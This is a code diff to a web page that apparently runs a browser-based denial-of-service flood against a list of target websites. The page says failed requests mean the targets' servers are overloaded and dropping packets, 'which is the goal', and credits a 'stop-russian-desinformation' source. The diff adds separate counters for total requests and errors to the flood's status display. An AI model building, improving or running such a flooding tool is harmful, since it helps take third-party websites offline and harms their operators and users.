@@ -137,7 +137,8 @@
     <h3>Session Status</h3>
     <p>The number of GET requests and error responses for each targeted website is shown below. Failure to fetch is normal! That means their servers are overloaded and dropping
         packets - which is the goal!</p>
-    <p>Total number of requests: <span id="total">0</span></p>
+    <p>Total number of requests: <span id="totalrequests">0</span></p>
+    <p>Total number of errors: <span id="totalerrors">0</span></p>
     <button type="button" class="btn btn-primary" onclick="togglePause();">Resume</button>
     </div>
 
@@ -149,7 +150,8 @@
     <p class="footer">Reformated from https://stop-russian-desinformation.near.page</p>
 
     <script>
-        var total = 0;
+        var totalrequests = 0;
+        var totalerrors = 0;
         
         // target list
         var urls = [
@@ -419,11 +421,13 @@
                             }
                             target.number_of_errored_responses++;
                             target.error_message = error.message;
+                            totalerrors++;
                         })
                         .then((response) => {
                             if (response && !response.ok) {
                                 target.number_of_errored_responses++;
                                 target.error_message = response.statusText;
+                                totalerrors++;
                             }
                             target.number_of_requests++;
                         })
@@ -442,7 +446,8 @@
             var errors_cell = document.querySelector(`#target${n} .errors`);
             requests_cell.innerText = number_of_requests;
             errors_cell.innerText = number_of_errored_responses;
-            document.querySelector("#total").innerText = total;
+            document.querySelector("#totalrequests").innerText = totalrequests;
+            document.querySelector("#totalerrors").innerText = totalerrors;
         }
 
         // Shuffle array order before starting
